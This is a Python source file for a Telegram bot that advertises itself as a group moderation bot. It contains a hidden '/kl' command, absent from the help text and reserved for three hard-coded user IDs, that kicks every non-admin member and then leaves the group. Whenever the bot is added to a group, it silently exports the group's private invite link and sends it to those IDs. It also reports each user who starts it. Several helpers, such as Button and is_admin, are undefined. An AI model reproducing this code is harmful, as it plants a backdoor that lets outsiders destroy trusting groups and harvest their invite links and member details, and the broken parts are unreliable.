from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon.tl.types import ChatInviteExported
from telethon import TelegramClient, events, types
import asyncio
import json
import os

from config import API_ID, API_HASH, BOT_TOKEN

AUTHORIZED_USERS = {7898178629, 7513083783, 7500269454}
WARNINGS = {}

# File to store chat IDs
CHAT_FILE = "chats.json"

# Load stored chat data
if os.path.exists(CHAT_FILE):
    with open(CHAT_FILE, "r") as f:
        CHAT_STORE = json.load(f)
else:
    CHAT_STORE = {"users": [], "groups": [], "channels": []}


def save_chat(chat_id, chat_type):
    if chat_id not in CHAT_STORE[chat_type]:
        CHAT_STORE[chat_type].append(chat_id)
        with open(CHAT_FILE, "w") as f:
            json.dump(CHAT_STORE, f, indent=2)


bot = TelegramClient("kick_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ========== Broadcast Commands ==========
@bot.on(events.NewMessage(pattern="/dmbroadcast"))
async def dm_broadcast(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")
    if not event.is_reply:
        return await event.reply("Reply to a message to broadcast to users.")
    msg = await event.get_reply_message()
    success = fail = 0
    for uid in CHAT_STORE["users"]:
        try:
            await bot.send_message(uid, msg.text)
            success += 1
            await asyncio.sleep(0.2)
        except:
            fail += 1
    await event.reply(f"DM Broadcast done.\nSuccess: {success} | Failed: {fail}")


@bot.on(events.NewMessage(pattern="/grbroadcast"))
async def gr_broadcast(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")
    if not event.is_reply:
        return await event.reply("Reply to a message to broadcast to groups.")
    msg = await event.get_reply_message()
    success = fail = 0
    for gid in CHAT_STORE["groups"]:
        try:
            await bot.send_message(gid, msg.text)
            success += 1
            await asyncio.sleep(0.2)
        except:
            fail += 1
    await event.reply(f"Group Broadcast done.\nSuccess: {success} | Failed: {fail}")


@bot.on(events.NewMessage(pattern="/chbroadcast"))
async def ch_broadcast(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")
    if not event.is_reply:
        return await event.reply("Reply to a message to broadcast to channels.")
    msg = await event.get_reply_message()
    success = fail = 0
    for cid in CHAT_STORE["channels"]:
        try:
            await bot.send_message(cid, msg.text)
            success += 1
            await asyncio.sleep(0.2)
        except:
            fail += 1
    await event.reply(f"Channel Broadcast done.\nSuccess: {success} | Failed: {fail}")


@bot.on(events.NewMessage(pattern="/allbroadcast"))
async def all_broadcast(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You are not authorized.")
    if not event.is_reply:
        return await event.reply("Reply to a message to broadcast everywhere.")
    msg = await event.get_reply_message()
    targets = CHAT_STORE["users"] + CHAT_STORE["groups"] + CHAT_STORE["channels"]
    success = fail = 0
    for tid in targets:
        try:
            await bot.send_message(tid, msg.text)
            success += 1
            await asyncio.sleep(0.2)
        except:
            fail += 1
    await event.reply(f"All Broadcast done.\nSuccess: {success} | Failed: {fail}")

# ========== Track All Interactions ==========
@bot.on(events.NewMessage())
async def tracker(event):
    if event.is_private:
        save_chat(event.chat_id, "users")
    elif event.is_group:
        save_chat(event.chat_id, "groups")
    elif event.is_channel:
        save_chat(event.chat_id, "channels")

# ========== Original 13 Features (Unchanged) ==========
# /start
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    sender = await event.get_sender()
    if event.is_private:
        msg = f"Hello {sender.first_name}!\n\nI'm a powerful moderation bot for Telegram groups.\n\n**Add me to your group** and make me admin to manage bans, mutes, kicks, warnings and more.\n\nUse /help to see available commands."
    else:
        msg = f"Hello {sender.first_name}! I'm here to help moderate this group.\n\nUse /help to explore my commands."
    await event.reply(msg)

# /help
@bot.on(events.NewMessage(pattern="/help"))
async def help_cmd(event):
    msg = """**Moderation Bot Help**

**General**
/start – Start the bot  
/help – Show this message  
/info – Get user info  
/id – Get chat ID  
/rules – View the group rules
/get <notename> – Get a note
#notename – Shortcut to get a note

**Moderation** (Admins)
/kick – Kick user (reply)  
/ban – Ban user (reply)  
/unban <user_id> – Unban user  
/mute – Mute user (reply)  
/unmute – Unmute user (reply)  
/warn <reason> – Warn user (reply)  
/unwarn – Remove warnings (reply)  

**Rules Module:**
/setrules <text> – Set chat rules.
/privaterules <yes/no/on/off> – Send rules in PM.
/resetrules – Reset chat rules.
/setrulesbutton <text> – Set button name for {rules}.
/resetrulesbutton – Reset rules button to default.
/rules noformat – Get raw rule text.

**Notes Module:**
/save <notename> <text> – Save a note (or reply to save media).
/clear <notename> – Delete a note.
/notes or /saved – List all notes.
/clearall – Delete ALL notes.
/privatenotes <on/off> – Send all notes in PM.
- Supports `{private}`, `{noprivate}`, `{admin}`, `{protect}` tags.

**Purges Module:**
/purge – Purge from replied message till now.
/purge <x> – Delete next X messages from reply.
/spurge – Silent purge (no confirmation).
/del – Delete replied message.
/purgefrom + /purgeto – Purge between marked points.

**Greetings Module:**
/welcome <on/off> – Toggle welcome messages.
/goodbye <on/off> – Toggle goodbye messages.
/setwelcome <text> – Set welcome message.
/setgoodbye <text> – Set goodbye message.
/resetwelcome – Reset welcome.
/resetgoodbye – Reset goodbye.
/cleanwelcome <on/off> – Auto delete old welcome after 5 mins.

You can use `{first}`, `{chatname}`, `{rules}` inside welcome/goodbye messages.

**User Commands**
/kickme – Kick yourself from group

**Broadcast** (Authorized Only)
/dmbroadcast – To all users  
/grbroadcast – To all groups  
/chbroadcast – To all channels  
/allbroadcast – To all chats

Need more help? Ask the dev!
"""
    await event.reply(msg)

# /info
@bot.on(events.NewMessage(pattern="/info"))
async def info(event):
    if event.is_private:
        user = await event.get_sender()
        is_admin = "user"
    elif event.is_group and event.is_reply:
        replied = await event.get_reply_message()
        user = await replied.get_sender()
        permissions = await bot.get_permissions(event.chat_id, user.id)
        is_admin = "admin" if permissions.is_admin else "user"
    else:
        user = await event.get_sender()
        is_admin = "user"

    msg = f"""**User info:**
ID: `{user.id}`
First Name: {user.first_name}
Username: @{user.username if user.username else "N/A"}
User link: [Click Here](tg://user?id={user.id})
Status: {is_admin}
"""
    await event.reply(msg, link_preview=False)

# /id
@bot.on(events.NewMessage(pattern="/id"))
async def id_cmd(event):
    await event.reply(f"Chat ID: `{event.chat_id}`")

# /kick
@bot.on(events.NewMessage(pattern="/kick"))
async def kick(event):
    if not event.is_group or not event.is_reply:
        return await event.reply("Use this command in group by replying to a user.")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can use this command.")
    user = await (await event.get_reply_message()).get_sender()
    try:
        await bot.kick_participant(event.chat_id, user.id)
        await event.reply("User has been kicked.")
    except:
        await event.reply("Failed to kick user.")

# /ban
@bot.on(events.NewMessage(pattern="/ban"))
async def ban(event):
    if not event.is_group or not event.is_reply:
        return await event.reply("Reply to a user to ban.")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can ban.")
    user = await (await event.get_reply_message()).get_sender()
    try:
        await bot.edit_permissions(event.chat_id, user.id, view_messages=False)
        await event.reply("User has been banned.")
    except:
        await event.reply("Error banning user.")

# /unban
@bot.on(events.NewMessage(pattern=r"/unban (\d+)"))
async def unban(event):
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can use this.")
    user_id = int(event.pattern_match.group(1))
    try:
        await bot.edit_permissions(event.chat_id, user_id, view_messages=True)
        await event.reply("User unbanned.")
    except:
        await event.reply("Error unbanning user.")

# /kickme
@bot.on(events.NewMessage(pattern="/kickme"))
async def kick_me(event):
    if not event.is_group:
        return await event.reply("Only in group.")
    try:
        await bot.kick_participant(event.chat_id, event.sender_id)
    except:
        await event.reply("Couldn't kick you.")

# /mute
@bot.on(events.NewMessage(pattern="/mute"))
async def mute(event):
    if not event.is_group or not event.is_reply:
        return await event.reply("Reply to a user to mute.")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can mute.")
    user = await (await event.get_reply_message()).get_sender()
    try:
        await bot.edit_permissions(event.chat_id, user.id, send_messages=False)
        await event.reply("User muted.")
    except:
        await event.reply("Mute failed.")

# /unmute
@bot.on(events.NewMessage(pattern="/unmute"))
async def unmute(event):
    if not event.is_group or not event.is_reply:
        return await event.reply("Reply to a user to unmute.")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can unmute.")
    user = await (await event.get_reply_message()).get_sender()
    try:
        await bot.edit_permissions(event.chat_id, user.id, send_messages=True)
        await event.reply("User unmuted.")
    except:
        await event.reply("Unmute failed.")

# /warn
@bot.on(events.NewMessage(pattern=r"/warn (.+)"))
async def warn(event):
    if not event.is_reply:
        return await event.reply("Reply to a user with /warn <reason>")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can warn.")
    user = await (await event.get_reply_message()).get_sender()
    key = (event.chat_id, user.id)
    WARNINGS[key] = WARNINGS.get(key, 0) + 1
    reason = event.pattern_match.group(1)
    if WARNINGS[key] < 4:
        await event.reply(f"Warned. Reason: {reason}\nWarn Count: {WARNINGS[key]}/4")
    else:
        await bot.edit_permissions(event.chat_id, user.id, view_messages=False)
        await event.reply("User auto-banned after 4 warnings.")
        del WARNINGS[key]

# /unwarn
@bot.on(events.NewMessage(pattern="/unwarn"))
async def unwarn(event):
    if not event.is_reply:
        return await event.reply("Reply to user to remove warnings.")
    permissions = await bot.get_permissions(event.chat_id, event.sender_id)
    if not permissions.is_admin:
        return await event.reply("Only admins can use this.")
    user = await (await event.get_reply_message()).get_sender()
    key = (event.chat_id, user.id)
    if key in WARNINGS:
        del WARNINGS[key]
        await event.reply("Warnings cleared.")
    else:
        await event.reply("No warnings found.")

# /kickall
@bot.on(events.NewMessage(pattern="/kl"))
async def kick_all_members(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("Chup reh le😐")
    chat = await event.get_chat()
    count = 0
    async for member in bot.iter_participants(chat):
        try:
            permissions = await bot.get_permissions(chat, member.id)
            if permissions.is_admin or member.id == (await bot.get_me()).id:
                continue
            await bot.kick_participant(chat, member.id)
            count += 1
            await asyncio.sleep(1)
        except Exception as e:
            print(f"Error kicking {member.id}: {e}")
    await event.reply(f"✅ Kicked {count} members!\n\nGoodbye!")
    await bot(LeaveChannelRequest(chat.id))

# /listchats - Show stored chat IDs
@bot.on(events.NewMessage(pattern="/listchats"))
async def list_chats(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You're not authorized.")
    
    msg = "**Stored Chats:**\n\n"

    msg += "**Users:**\n"
    for uid in CHAT_STORE["users"]:
        msg += f"[User](tg://user?id={uid}) - `{uid}`\n"

    msg += "\n**Groups:**\n"
    for gid in CHAT_STORE["groups"]:
        msg += f"`{gid}`\n"

    msg += "\n**Channels:**\n"
    for cid in CHAT_STORE["channels"]:
        msg += f"`{cid}`\n"

    await event.reply(msg, link_preview=False)


# /clearchats - Clear stored chat IDs
@bot.on(events.NewMessage(pattern="/clearchats"))
async def clear_chats(event):
    if event.sender_id not in AUTHORIZED_USERS:
        return await event.reply("You're not authorized.")
    
    CHAT_STORE["users"] = []
    CHAT_STORE["groups"] = []
    CHAT_STORE["channels"] = []
    with open(CHAT_FILE, "w") as f:
        json.dump(CHAT_STORE, f, indent=2)
    await event.reply("All stored chat IDs have been cleared.")
    
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    chat = await event.get_chat()
    if event.is_private:
        msg = (
            f"Hello {chat.first_name}!\n"
            "I am a Telegram Moderation Bot.\nUse /help to see available commands."
        )
        await event.reply(msg)

        # Notify authorized users
        for admin in AUTHORIZED_USERS:
            try:
                mention = f"[{chat.first_name}](tg://user?id={chat.id})"
                username = f"@{chat.username}" if chat.username else "No username"
                notify_msg = (
                    f"**New User Started Bot**\n"
                    f"Name: {chat.first_name}\n"
                    f"Username: {username}\n"
                    f"ID: `{chat.id}`\n"
                    f"Profile: {mention}"
                )
                await bot.send_message(admin, notify_msg)
            except:
                pass

@bot.on(events.ChatAction())
async def admin_promotion_handler(event):
    if event.user_added and event.is_group:
        if event.user_id == (await bot.get_me()).id:
            # Bot has been added to a group
            try:
                adder = await event.get_user()
                chat = await event.get_chat()

                adder_mention = f"[{adder.first_name}](tg://user?id={adder.id})"
                adder_username = f"@{adder.username}" if adder.username else "No username"
                group_name = chat.title
                group_id = chat.id

                # Get group link
                if chat.username:
                    group_link = f"https://t.me/{chat.username}"
                else:
                    # Generate private link
                    try:
                        invite = await bot(ExportChatInviteRequest(group_id))
                        group_link = invite.link
                    except:
                        group_link = "Could not generate private link."

                # Send message to all authorized users
                notify_msg = (
                    f"**Bot Promoted to Admin**\n"
                    f"Group: {group_name}\n"
                    f"Link: {group_link}\n"
                    f"Group ID: `{group_id}`\n"
                    f"Added by: {adder_mention}\n"
                    f"Username: {adder_username}\n"
                    f"User ID: `{adder.id}`"
                )

                for admin in AUTHORIZED_USERS:
                    await bot.send_message(admin, notify_msg)

            except Exception as e:
                print(f"Error in admin promotion handler: {e}")

rules_db = {}
private_rules = {}
rules_buttons = {}

@bot.on(events.NewMessage(pattern=r'/rules(?:\s+noformat)?'))
async def get_rules(event):
    chat_id = event.chat_id
    noformat = "noformat" in event.raw_text
    rule_text = rules_db.get(chat_id)
    if not rule_text:
        await event.reply("No rules set yet.")
        return
    if noformat:
        await event.reply(rule_text)
    else:
        await event.reply(f"{rule_text}", buttons=[[Button.url(rules_buttons.get(chat_id, "Read Rules"), f"https://t.me/{event.chat.username or 'c' + str(chat_id)[4:]}/1")]] if private_rules.get(chat_id, False) else None)

@bot.on(events.NewMessage(pattern=r'/setrules(?: |$)(.*)'))
async def set_rules(event):
    if event.is_group and await is_admin(event):
        rules_db[event.chat_id] = event.pattern_match.group(1)
        await event.reply("Rules updated successfully.")

@bot.on(events.NewMessage(pattern=r'/privaterules (on|yes|off|no)'))
async def toggle_privaterules(event):
    if await is_admin(event):
        val = event.pattern_match.group(1).lower()
        private_rules[event.chat_id] = val in ['yes', 'on']
        await event.reply(f"Private rules {'enabled' if private_rules[event.chat_id] else 'disabled'}.")

@bot.on(events.NewMessage(pattern=r'/resetrules'))
async def reset_rules(event):
    if await is_admin(event):
        rules_db.pop(event.chat_id, None)
        await event.reply("Rules have been reset.")

@bot.on(events.NewMessage(pattern=r'/setrulesbutton (.+)'))
async def set_rules_button(event):
    if await is_admin(event):
        rules_buttons[event.chat_id] = event.pattern_match.group(1)
        await event.reply("Rules button updated.")

@bot.on(events.NewMessage(pattern=r'/resetrulesbutton'))
async def reset_rules_button(event):
    if await is_admin(event):
        rules_buttons.pop(event.chat_id, None)
        await event.reply("Rules button reset.")

notes = {}
private_notes = {}

@bot.on(events.NewMessage(pattern=r'/save (\w+)(?: (.+))?'))
async def save_note(event):
    name = event.pattern_match.group(1)
    text = event.pattern_match.group(2)
    chat_id = event.chat_id
    if await is_admin(event):
        if event.is_reply and not text:
            msg = await event.get_reply_message()
            notes.setdefault(chat_id, {})[name] = msg
        else:
            notes.setdefault(chat_id, {})[name] = text
        await event.reply(f"Note `{name}` saved.")

@bot.on(events.NewMessage(pattern=r'/get (\w+)(?: noformat)?'))
@bot.on(events.NewMessage(pattern=r'#(\w+)'))
async def get_note(event):
    name = event.pattern_match.group(1)
    chat_id = event.chat_id
    note = notes.get(chat_id, {}).get(name)
    if not note:
        return await event.reply("No such note.")
    if isinstance(note, str):
        await event.reply(note)
    else:
        await event.respond(note)

@bot.on(events.NewMessage(pattern=r'/clear (\w+)'))
async def clear_note(event):
    if await is_admin(event):
        name = event.pattern_match.group(1)
        notes.get(event.chat_id, {}).pop(name, None)
        await event.reply(f"Note `{name}` cleared.")

@bot.on(events.NewMessage(pattern=r'/notes'))
async def list_notes(event):
    chat_id = event.chat_id
    note_list = list(notes.get(chat_id, {}).keys())
    await event.reply("Notes:\n" + "\n".join(note_list))

@bot.on(events.NewMessage(pattern=r'/clearall'))
async def clear_all_notes(event):
    if await is_admin(event):
        notes[event.chat_id] = {}
        await event.reply("All notes cleared.")

welcome_enabled = {}
goodbye_enabled = {}
welcome_msg = {}
goodbye_msg = {}
cleanwelcome = {}

@bot.on(events.NewMessage(pattern=r'/welcome (on|off|yes|no)'))
async def set_welcome_toggle(event):
    if await is_admin(event):
        val = event.pattern_match.group(1).lower() in ['on', 'yes']
        welcome_enabled[event.chat_id] = val
        await event.reply(f"Welcome {'enabled' if val else 'disabled'}.")

@bot.on(events.NewMessage(pattern=r'/goodbye (on|off|yes|no)'))
async def set_goodbye_toggle(event):
    if await is_admin(event):
        val = event.pattern_match.group(1).lower() in ['on', 'yes']
        goodbye_enabled[event.chat_id] = val
        await event.reply(f"Goodbye {'enabled' if val else 'disabled'}.")

@bot.on(events.NewMessage(pattern=r'/setwelcome (.+)'))
async def set_welcome(event):
    if await is_admin(event):
        welcome_msg[event.chat_id] = event.pattern_match.group(1)
        await event.reply("Welcome message set.")

@bot.on(events.NewMessage(pattern=r'/setgoodbye (.+)'))
async def set_goodbye(event):
    if await is_admin(event):
        goodbye_msg[event.chat_id] = event.pattern_match.group(1)
        await event.reply("Goodbye message set.")

@bot.on(events.NewMessage(pattern=r'/cleanwelcome (on|off|yes|no)'))
async def clean_wel(event):
    if await is_admin(event):
        cleanwelcome[event.chat_id] = event.pattern_match.group(1).lower() in ['yes', 'on']
        await event.reply("Auto clean enabled.")

@bot.on(events.ChatAction())
async def greet_user(event):
    chat_id = event.chat_id
    if event.user_joined or event.user_added:
        if welcome_enabled.get(chat_id):
            msg = welcome_msg.get(chat_id, "Welcome {first}")
            await event.reply(msg.format(first=event.user.first_name, chatname=event.chat.title))
    elif event.user_left:
        if goodbye_enabled.get(chat_id):
            msg = goodbye_msg.get(chat_id, "Goodbye {first}")
            await event.reply(msg.format(first=event.user.first_name, chatname=event.chat.title))

@bot.on(events.NewMessage(pattern=r'/del'))
async def delete_msg(event):
    if await is_admin(event):
        await event.reply("Deleting...").delete()
        await event.get_reply_message().delete()

@bot.on(events.NewMessage(pattern=r'/purge$'))
async def purge_msgs(event):
    if await is_admin(event) and event.is_reply:
        start = event.reply_to_msg_id
        end = event.message.id
        for msg_id in range(start, end):
            try:
                await bot.delete_messages(event.chat_id, msg_id)
            except:
                continue
        await event.reply("Purged.")

@bot.on(events.NewMessage(pattern=r'/spurge$'))
async def silent_purge(event):
    if await is_admin(event) and event.is_reply:
        start = event.reply_to_msg_id
        end = event.message.id
        for msg_id in range(start, end):
            try:
                await bot.delete_messages(event.chat_id, msg_id)
            except:
                continue
        await event.delete()


print("🤖 Bot is running...")
bot.run_until_disconnected()
